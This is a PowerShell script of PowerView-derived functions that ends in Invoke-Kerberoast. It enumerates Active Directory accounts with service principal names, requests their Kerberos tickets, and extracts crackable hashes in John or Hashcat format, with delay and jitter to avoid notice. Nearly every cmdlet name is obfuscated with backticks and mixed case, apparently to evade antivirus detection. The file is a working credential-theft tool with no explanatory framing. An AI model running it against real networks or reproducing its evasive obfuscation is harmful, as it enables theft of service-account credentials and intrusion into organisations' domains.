function Get-DomainSearcher {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $TargetDomain = $Domain
        }
        else {
            
            if ($PSBoundParameters['Credential']) {
                $DomainObject = GET-`dOM`AiN -Credential $Credential
            }
            else {
                $DomainObject = Get-Do`mA`iN
            }
            $TargetDomain = $DomainObject.Name
        }

        if (-not $PSBoundParameters['Server']) {
            
            try {
                if ($DomainObject) {
                    $BindServer = $DomainObject.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $BindServer = ((gEt-DO`m`Ain -Credential $Credential).PdcRoleOwner).Name
                }
                else {
                    $BindServer = ((gEt`-DoM`A`In).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[Get-DomainSearcher] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $BindServer = $Server
        }

        $SearchString = 'LDAP://'

        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($SearchBase -Match '^GC://') {
                
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match '^LDAP://') {
                    if ($SearchBase -match "LDAP://.+/.+") {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        wr`i`TE-VE`R`BOse "[Get-DomainSearcher] search string: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            w`Ri`T`e-vErbOSE "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
            
            $DomainObject = NEW-`ob`J`ect DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = NeW-O`Bj`eCT System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            
            $Searcher = n`EW-o`BjECT System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }

        if ($PSBoundParameters['Tombstone']) {
            $Searcher.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $Searcher.filter = $LDAPFilter
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            
            $PropertiesToLoad = $Properties| FOrE`Ac`h-O`Bje`ct { $_.Split(',') }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}


function Convert-LDAPProperty {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | F`OreaC`h-Ob`Je`cT {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                
                $ObjectProperties[$_] = $Properties[$_] | FoR`Each-Ob`jECT { (New-obJ`e`CT System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq 'samaccounttype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq 'objectguid') {
                
                $ObjectProperties[$_] = (new-O`Bj`ect Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                
                $Descriptor = ne`w`-obj`EcT Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties['Owner'] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties['Group'] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = "NEVER"
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    wri`T`E-VERbosE "[Convert-LDAPProperty] error: $_"
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        neW-o`B`J`ECT -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        wR`itE-WaR`N`iNG "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}


function Get-Domain {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Wri`Te-verB`oSe '[Get-Domain] Using alternate credentials for Get-Domain'

            if ($PSBoundParameters['Domain']) {
                $TargetDomain = $Domain
            }
            else {
                
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                WRI`TE-VERbo`se "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
            }

            $DomainContext = new-oBJ`E`CT System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                WriTE`-vE`RBOSe "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $DomainContext = ne`w-`ob`JECT System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                WRiTe-v`Erbo`se "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                wrIte`-VER`Bose "[Get-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}



function Get-DomainSPNTicket {


    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'John',

        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $LogonToken = iNVOkE`-USEr`iMpe`RS`oNA`TiOn -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }
	
	$RandNo = neW-`Ob`JeCt System.Random

        ForEach ($Object in $TargetObject) {

            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = 'UNKNOWN'
                $DistinguishedName = 'UNKNOWN'
            }

            
            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }

            try {
                $Ticket = n`e`w-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                WRitE`-wAr`NinG "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $Out = NEw-`oB`JeCT PSObject

                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

                
                
                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

                    
                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                        wRit`e-war`N`ing 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | a`Dd-m`EM`Ber Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                    } else {
                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out | ad`d-`m`embER Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    WRItE-w`A`RNinG "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | AdD`-`MembeR Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                }

                if($Hash) {
                    if ($OutputFormat -match 'John') {
                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($DistinguishedName -ne 'UNKNOWN') {
                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $UserDomain = 'UNKNOWN'
                        }

                        
                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | a`dD-me`mBEr Noteproperty 'Hash' $HashFormat
                }

                $Out | ADD`-MeM`Ber Noteproperty 'SamAccountName' $SamAccountName
                $Out | AdD`-mem`Ber Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | aDD`-MEM`Ber Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                wrIte-o`UtP`UT $Out
            }
            
            STA`RT-SLe`Ep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
        }
    }

    END {
        if ($LogonToken) {
            I`NVOkE-R`EVErTT`oS`elf -TokenHandle $LogonToken
        }
    }
}

function Get-DomainUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $AllowDelegation,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $UserSearcher = GET-D`omAin`SeAr`CH`eR @SearcherArguments
    }

    PROCESS {
        
        
        
        

        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | wheRe-OB`Je`cT {$_} | f`ore`Ach-o`BjECt {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        wriT`E-vE`RBO`sE "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = geT`-domai`Ns`EA`RCH`ER @SearcherArguments
                        if (-not $UserSearcher) {
                            WrItE-w`ARN`inG "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForeAc`h`-`objeCt { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | cOnvER`T-`A`dNAme -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $UserName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments['Domain'] = $UserDomain
                        WriT`E-vE`RBoSe "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = ge`T-doM`AInS`eArcHER @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }

            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['SPN']) {
                WrI`TE`-Ve`RboSe '[Get-DomainUser] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                WrI`Te-Ve`Rb`OSE '[Get-DomainUser] Searching for users who can be delegated'
                
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                wRiTE`-v`E`Rbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                w`Ri`TE-v`erbOse '[Get-DomainUser] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                wRiTE`-`VErB`OsE '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                wriTE-`Ve`R`BOsE '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                wRiT`E-`VeRbosE "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            
            $UACFilter | w`HeRE-O`B`jEcT {$_} | fOREAC`h-`O`BjecT {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            wrIte-V`eR`BO`SE "[Get-DomainUser] filter string: $($UserSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | whe`R`e-obj`ECt {$_} | forE`ACh-O`B`JecT {
                if ($PSBoundParameters['Raw']) {
                    
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = cON`VERt-`ldap`pRoPERTY -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    wRi`T`E-v`ErBOse "[Get-DomainUser] Error disposing of the Results object: $_"
                }
            }
            $UserSearcher.dispose()
        }
    }
}


function Invoke-Kerberoast {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'John',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserSearcherArguments = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Credential']) {
            $LogonToken = inVo`Ke-`Use`RImp`e`R`SO`NatiOn -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
        g`E`T-dOmAIN`USER @UserSearcherArguments | wheR`e-`oB`JeCT {$_.samaccountname -ne 'krbtgt'} | get`-DOM`AiNS`P`NTiCkET -Delay $Delay -OutputFormat $OutputFormat -Jitter $Jitter
    }

    END {
        if ($LogonToken) {
            In`V`oke-revErt`TOS`ELf -TokenHandle $LogonToken
        }
    }
}

